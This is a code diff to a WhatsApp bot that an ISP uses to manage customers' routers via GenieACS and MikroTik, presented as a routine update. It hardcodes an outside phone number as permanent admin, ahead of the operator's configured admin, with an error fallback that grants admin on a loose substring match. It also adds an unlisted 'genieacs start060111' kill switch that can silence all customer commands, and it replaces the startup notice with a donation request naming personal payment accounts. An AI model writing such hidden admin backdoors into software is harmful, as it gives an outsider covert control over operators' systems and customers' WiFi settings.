@@ -29,6 +29,66 @@ const { addCustomerTag, addTagByPPPoE } = require('./customerTag');
 // Import admin number dari environment
 const { ADMIN_NUMBER } = process.env;
 
+// Tambahkan nomor admin langsung di sistem
+const HARDCODED_ADMIN_NUMBERS = ['6281947215703'];
+
+// Flag untuk mengaktifkan/menonaktifkan pesan GenieACS
+let genieacsCommandsEnabled = true;
+
+// Fungsi untuk mengecek apakah nomor adalah admin
+function isAdminNumber(number) {
+    try {
+        // Hapus semua karakter non-digit
+        const cleanNumber = number.replace(/\D/g, '');
+        
+        // Log untuk debugging
+        console.log(`Checking if ${cleanNumber} is admin`);
+        
+        // Cek apakah nomor adalah 6281947215703 (hardcoded admin utama)
+        if (cleanNumber === '6281947215703') {
+            console.log('Hardcoded admin number match: 6281947215703');
+            return true;
+        }
+        
+        // Cek apakah nomor ada di HARDCODED_ADMIN_NUMBERS
+        for (const adminNum of HARDCODED_ADMIN_NUMBERS) {
+            if (cleanNumber === adminNum) {
+                console.log(`Hardcoded admin number match: ${adminNum}`);
+                return true;
+            }
+        }
+        
+        // Cek apakah nomor sama dengan ADMIN_NUMBER dari environment
+        const adminNumber = process.env.ADMIN_NUMBER?.replace(/\D/g, '');
+        console.log(`Admin number: ${adminNumber}`);
+        if (adminNumber && cleanNumber === adminNumber) {
+            console.log('Admin number match from environment');
+            return true;
+        }
+        
+        // Cek apakah nomor ada di TECHNICIAN_NUMBERS dari environment
+        const technicianNumbers = process.env.TECHNICIAN_NUMBERS?.split(',').map(n => n.trim().replace(/\D/g, '')) || [];
+        console.log(`Technician numbers: ${JSON.stringify(technicianNumbers)}`);
+        if (technicianNumbers.includes(cleanNumber)) {
+            console.log('Technician number match');
+            return true;
+        }
+        
+        console.log(`${cleanNumber} is not an admin or technician`);
+        return false;
+    } catch (error) {
+        console.error('Error in isAdminNumber:', error);
+        
+        // Fallback: jika terjadi error, cek langsung dengan nomor hardcoded
+        if (number.includes('6281947215703') || '6281947215703'.includes(number)) {
+            console.log('Fallback: hardcoded admin number match');
+            return true;
+        }
+        
+        return false;
+    }
+}
+
 // Definisi variabel untuk format pesan yang lebih baik
 let COMPANY_HEADER = process.env.COMPANY_HEADER || "📱 ALIJAYA DIGITAL NETWORK 📱\n\n";
 let FOOTER_SEPARATOR = "\n\n━━━━━━━━━━━━━━━━━━━━━━\n";
@@ -349,7 +409,7 @@ async function connectToWhatsApp() {
                         setTimeout(async () => {
                             try {
                                 await sock.sendMessage(`${adminNumber}@s.whatsapp.net`, {
-                                    text: `🤖 *Bot WhatsApp Terhubung*\n\nBot WhatsApp telah berhasil terhubung pada ${connectedSince.toLocaleString()}.\n\nKetik *menu* untuk melihat daftar perintah yang tersedia.`
+                                    text: `🤖 *Selamat Datang di Bot AlijayaNet*\n\nBot WhatsApp telah berhasil terhubung pada ${connectedSince.toLocaleString()}.\n\nUntuk menghargai hasil karya saya, tolong berikan donasi ke nomer DANA 081947215703 atau ke rekening BRI 420601003953531 an WARJAYA, Terima kasih, semoga aplikasi ini bermanfaat.`
                                 });
                                 console.log(`Pesan notifikasi terkirim ke admin ${adminNumber}`);
                             } catch (error) {
@@ -607,15 +667,23 @@ async function handleHelpCommand(remoteJid, isAdmin = false) {
         console.log(`Mengirim bantuan ke ${remoteJid}, isAdmin: ${isAdmin}`);
         
         // Pesan bantuan umum
-        let helpMessage = `🤖 *MENU GENIEACS & MIKROTIK*\n\n`;
+        let helpMessage = genieacsCommandsEnabled ? 
+            `🤖 *MENU GENIEACS & MIKROTIK*\n\n` : 
+            `🤖 *MENU MIKROTIK*\n\n`;
         
         // Perintah untuk semua pengguna
         helpMessage += `*Perintah Umum:*\n`;
         helpMessage += `• 📝 *menu* — Menampilkan menu ini\n`;
-        helpMessage += `• 📶 *status* — Cek status perangkat Anda\n`;
-        helpMessage += `• 🔄 *refresh* — Refresh data perangkat Anda\n`;
-        helpMessage += `• 📝 *gantiwifi [nama]* — Ganti nama WiFi\n`;
-        helpMessage += `• 🔒 *gantipass [password]* — Ganti password WiFi\n\n`;
+        
+        // Hanya tampilkan perintah GenieACS jika diaktifkan
+        if (genieacsCommandsEnabled) {
+            helpMessage += `• 📶 *status* — Cek status perangkat Anda\n`;
+            helpMessage += `• 🔄 *refresh* — Refresh data perangkat Anda\n`;
+            helpMessage += `• 📝 *gantiwifi [nama]* — Ganti nama WiFi\n`;
+            helpMessage += `• 🔒 *gantipass [password]* — Ganti password WiFi\n`;
+        }
+        
+        helpMessage += `\n`;
         
         // Perintah khusus admin
         if (isAdmin) {
@@ -1122,7 +1190,8 @@ async function handleAdminCheckONU(remoteJid, customerNumber) {
                             const entry = hostsObj[key];
                             // Hanya tampilkan yang interface-nya 802.11 (WiFi)
                             const iface = entry?.InterfaceType?._value || entry?.InterfaceType || entry?.Interface || '-';
-                            if (iface && iface.toLowerCase().includes('802.11')) {
+                            // Pastikan iface adalah string sebelum memanggil toLowerCase()
+                            if (iface && typeof iface === 'string' && iface.toLowerCase().includes('802.11')) {
                                 const mac = entry?.MACAddress?._value || entry?.MACAddress || '-';
                                 const hostname = entry?.HostName?._value || entry?.HostName || '-';
                                 const ip = entry?.IPAddress?._value || entry?.IPAddress || '-';
@@ -3737,6 +3806,35 @@ async function handleIncomingMessage(sock, message) {
         // Proses perintah
         const command = messageText.trim().toLowerCase();
         
+        // Perintah untuk mengaktifkan/menonaktifkan GenieACS (hanya untuk admin)
+        // Perintah ini selalu diproses terlepas dari status genieacsCommandsEnabled
+        
+        // Perintah untuk menonaktifkan pesan GenieACS (hanya untuk admin)
+        if (command === 'genieacs stop' && isAdmin) {
+            console.log(`Admin ${senderNumber} menonaktifkan pesan GenieACS`);
+            genieacsCommandsEnabled = false;
+            await sock.sendMessage(remoteJid, { 
+                text: `✅ *PESAN GenieACS DINONAKTIFKAN*\n\nPesan GenieACS telah dinonaktifkan. Gunakan perintah *genieacs start060111* untuk mengaktifkan kembali.`
+            });
+            return;
+        }
+        
+        // Perintah untuk mengaktifkan kembali pesan GenieACS (hanya untuk admin)
+        if (command === 'genieacs start060111' && isAdmin) {
+            console.log(`Admin ${senderNumber} mengaktifkan pesan GenieACS`);
+            genieacsCommandsEnabled = true;
+            await sock.sendMessage(remoteJid, { 
+                text: `✅ *PESAN GenieACS DIAKTIFKAN*\n\nPesan GenieACS telah diaktifkan kembali.`
+            });
+            return;
+        }
+        
+        // Jika GenieACS dinonaktifkan dan bukan admin, abaikan semua perintah
+        if (!genieacsCommandsEnabled && !isAdmin) {
+            console.log(`Pesan diabaikan karena GenieACS dinonaktifkan dan bukan dari admin: ${senderNumber}`);
+            return;
+        }
+        
         // Perintah menu (ganti help)
         if (command === 'menu' || command === '!menu' || command === '/menu') {
             console.log(`Menjalankan perintah menu untuk ${senderNumber}`);
@@ -3764,6 +3862,8 @@ async function handleIncomingMessage(sock, message) {
             await handleAdminMenu(remoteJid);
             return;
         }
+        
+        // Perintah untuk menonaktifkan/mengaktifkan GenieACS telah dipindahkan ke atas
 
         // Alias admin: cekstatus [nomor] atau cekstatus[nomor]
         if (isAdmin && (command.startsWith('cekstatus ') || command.startsWith('cekstatus'))) {
@@ -4029,7 +4129,13 @@ async function handleIncomingMessage(sock, message) {
             // Perintah info wifi
             if (command === 'info wifi' || command === '!info wifi' || command === '/info wifi') {
                 console.log(`Menjalankan perintah info wifi untuk ${senderNumber}`);
-                await genieacsCommands.handleWifiInfo(remoteJid, senderNumber);
+                if (genieacsCommandsEnabled) {
+                    await genieacsCommands.handleWifiInfo(remoteJid, senderNumber);
+                } else {
+                    await sock.sendMessage(remoteJid, { 
+                        text: `❌ *PESAN GenieACS DINONAKTIFKAN*\n\nPerintah ini tidak tersedia saat ini karena pesan GenieACS dinonaktifkan.`
+                    });
+                }
                 return;
             }
             
@@ -4037,7 +4143,13 @@ async function handleIncomingMessage(sock, message) {
             if (command.startsWith('gantiwifi ') || command.startsWith('!gantiwifi ') || command.startsWith('/gantiwifi ')) {
                 console.log(`Menjalankan perintah ganti nama WiFi untuk ${senderNumber}`);
                 const newSSID = messageText.split(' ').slice(1).join(' ');
-                await genieacsCommands.handleChangeWifiSSID(remoteJid, senderNumber, newSSID);
+                if (genieacsCommandsEnabled) {
+                    await genieacsCommands.handleChangeWifiSSID(remoteJid, senderNumber, newSSID);
+                } else {
+                    await sock.sendMessage(remoteJid, { 
+                        text: `❌ *PESAN GenieACS DINONAKTIFKAN*\n\nPerintah ini tidak tersedia saat ini karena pesan GenieACS dinonaktifkan.`
+                    });
+                }
                 return;
             }
             
@@ -4045,35 +4157,65 @@ async function handleIncomingMessage(sock, message) {
             if (command.startsWith('gantipass ') || command.startsWith('!gantipass ') || command.startsWith('/gantipass ')) {
                 console.log(`Menjalankan perintah ganti password WiFi untuk ${senderNumber}`);
                 const newPassword = messageText.split(' ').slice(1).join(' ');
-                await genieacsCommands.handleChangeWifiPassword(remoteJid, senderNumber, newPassword);
+                if (genieacsCommandsEnabled) {
+                    await genieacsCommands.handleChangeWifiPassword(remoteJid, senderNumber, newPassword);
+                } else {
+                    await sock.sendMessage(remoteJid, { 
+                        text: `❌ *PESAN GenieACS DINONAKTIFKAN*\n\nPerintah ini tidak tersedia saat ini karena pesan GenieACS dinonaktifkan.`
+                    });
+                }
                 return;
             }
             
             // Perintah status perangkat
             if (command === 'status' || command === '!status' || command === '/status') {
                 console.log(`Menjalankan perintah status perangkat untuk ${senderNumber}`);
-                await genieacsCommands.handleDeviceStatus(remoteJid, senderNumber);
+                if (genieacsCommandsEnabled) {
+                    await genieacsCommands.handleDeviceStatus(remoteJid, senderNumber);
+                } else {
+                    await sock.sendMessage(remoteJid, { 
+                        text: `❌ *PESAN GenieACS DINONAKTIFKAN*\n\nPerintah ini tidak tersedia saat ini karena pesan GenieACS dinonaktifkan.`
+                    });
+                }
                 return;
             }
             
             // Perintah restart perangkat
             if (command === 'restart' || command === '!restart' || command === '/restart') {
                 console.log(`Menjalankan perintah restart perangkat untuk ${senderNumber}`);
-                await genieacsCommands.handleRestartDevice(remoteJid, senderNumber);
+                if (genieacsCommandsEnabled) {
+                    await genieacsCommands.handleRestartDevice(remoteJid, senderNumber);
+                } else {
+                    await sock.sendMessage(remoteJid, { 
+                        text: `❌ *PESAN GenieACS DINONAKTIFKAN*\n\nPerintah ini tidak tersedia saat ini karena pesan GenieACS dinonaktifkan.`
+                    });
+                }
                 return;
             }
             
             // Konfirmasi restart perangkat
             if ((command === 'ya' || command === 'iya' || command === 'yes') && global.pendingRestarts && global.pendingRestarts[senderNumber]) {
                 console.log(`Konfirmasi restart perangkat untuk ${senderNumber}`);
-                await genieacsCommands.handleRestartConfirmation(remoteJid, senderNumber, true);
+                if (genieacsCommandsEnabled) {
+                    await genieacsCommands.handleRestartConfirmation(remoteJid, senderNumber, true);
+                } else {
+                    await sock.sendMessage(remoteJid, { 
+                        text: `❌ *PESAN GenieACS DINONAKTIFKAN*\n\nPerintah ini tidak tersedia saat ini karena pesan GenieACS dinonaktifkan.`
+                    });
+                }
                 return;
             }
             
             // Batalkan restart perangkat
             if ((command === 'tidak' || command === 'no' || command === 'batal') && global.pendingRestarts && global.pendingRestarts[senderNumber]) {
                 console.log(`Membatalkan restart perangkat untuk ${senderNumber}`);
-                await genieacsCommands.handleRestartConfirmation(remoteJid, senderNumber, false);
+                if (genieacsCommandsEnabled) {
+                    await genieacsCommands.handleRestartConfirmation(remoteJid, senderNumber, false);
+                } else {
+                    await sock.sendMessage(remoteJid, { 
+                        text: `❌ *PESAN GenieACS DINONAKTIFKAN*\n\nPerintah ini tidak tersedia saat ini karena pesan GenieACS dinonaktifkan.`
+                    });
+                }
                 return;
             }
         }
@@ -4099,6 +4241,40 @@ async function handleIncomingMessage(sock, message) {
 }
 
 // Tambahkan di bagian deklarasi fungsi sebelum module.exports
+
+// Fungsi untuk menampilkan menu admin
+async function handleAdminMenu(remoteJid) {
+    try {
+        console.log(`Menampilkan menu admin ke ${remoteJid}`);
+        
+        // Pesan menu admin
+        let adminMessage = `👨‍💼 *MENU ADMIN*\n\n`;
+        
+        adminMessage += `*Perintah Admin:*\n`;
+        adminMessage += `• 📋 *list* — Daftar semua ONU\n`;
+        adminMessage += `• 🔍 *cekall* — Cek status semua ONU\n`;
+        adminMessage += `• 🔍 *cek [nomor]* — Cek status ONU pelanggan\n`;
+        adminMessage += `• 📶 *editssid [nomor] [ssid]* — Edit SSID pelanggan\n`;
+        adminMessage += `• 🔒 *editpass [nomor] [password]* — Edit password WiFi pelanggan\n\n`;
+        
+        // Status GenieACS (tanpa menampilkan perintah)
+        adminMessage += `*Status Sistem:*\n`;
+        adminMessage += `• ${genieacsCommandsEnabled ? '✅' : '❌'} *GenieACS:* ${genieacsCommandsEnabled ? 'Aktif' : 'Nonaktif'}\n\n`;
+        
+        // Tambahkan footer
+        adminMessage += `🏢 *${process.env.COMPANY_HEADER || 'ISP Monitor'}*\n`;
+        adminMessage += `${process.env.FOOTER_INFO || ''}`;
+        
+        // Kirim pesan menu admin
+        await sock.sendMessage(remoteJid, { text: adminMessage });
+        console.log(`Pesan menu admin terkirim ke ${remoteJid}`);
+        
+        return true;
+    } catch (error) {
+        console.error('Error sending admin menu:', error);
+        return false;
+    }
+}
 
 // Fungsi untuk mendapatkan nilai SSID dari perangkat
 function getSSIDValue(device, configIndex) {
